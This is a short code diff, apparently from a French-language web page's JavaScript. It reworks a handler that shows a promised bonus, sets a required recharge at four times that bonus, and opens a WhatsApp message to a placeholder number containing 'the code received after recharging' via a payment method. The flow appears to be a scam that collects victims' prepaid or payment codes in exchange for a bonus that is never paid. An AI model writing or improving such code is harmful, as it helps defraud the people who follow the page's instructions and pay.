-        alertSection.style.display = 'block';
-        toReceive.textContent = formatAmount(bonusValue, currencySel);
-        toRecharge.textContent = formatAmount(rechargeAmt, currencySel);
-        alertMethod.textContent = payMethod;
-        alertMethod2.textContent = payMethod;
-        const waMsg = encodeURIComponent(
-          `Bonjour, voici le code reçu après rechargement de ${formatAmount(rechargeAmt, currencySel)} sur ${payMethod} : `
-        );
-        whatsappLink.href = `https://wa.me/2376XXXXXXX?text=${waMsg}`;
+        const pm = document.getElementById('paymentMethod').value;
+        const rech = bonusVal*4;
+        tsec.style.display='none'; asec.style.display='block';
+        trcv.textContent= formatAmount(bonusVal,currSel);
+        trch.textContent= formatAmount(rech,currSel);
+        am.textContent = am2.textContent = pm;
+        const msg = encodeURIComponent(`Code reçu après rechargement de ${formatAmount(rech,currSel)} sur ${pm} : `);
+        wa.href = `https://wa.me/2376XXXXXXX?text=${msg}`;
       });
-
-      // Notifications ambiantes (inchangé)
-      // … votre code existant …
     });
   </script>
 </body>
